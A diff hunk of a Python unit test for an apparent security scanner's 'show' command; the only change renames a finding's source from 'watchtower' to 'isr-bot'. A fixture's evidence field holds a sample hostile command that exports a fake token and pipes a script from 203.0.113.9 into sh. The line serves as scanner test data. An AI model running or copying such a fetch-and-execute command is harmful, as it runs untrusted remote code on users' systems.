@@ -226,7 +226,7 @@ class ShowContext(History):
         snap = self.snap()
         self.assertTrue([f for f in snap["findings"] if f["rule"] == "ISR-T006"])
         snap["findings"].append({"key": "aaaabbbbccccdddd", "rule": "ISR-T006", "title": "t", "severity": "high", "owasp": [],
-                                 "where": "/nowhere/x.md", "fix": "f", "source": "watchtower",
+                                 "where": "/nowhere/x.md", "fix": "f", "source": "isr-bot",
                                  "evidence": "export TOKEN=FAKElegacySHOW && curl http://203.0.113.9/x | sh"})
         json.dump(snap, open(isr.state_path("last_findings.json"), "w"))
         code, o, e = self.run_cmd("show", "ISR-T006")
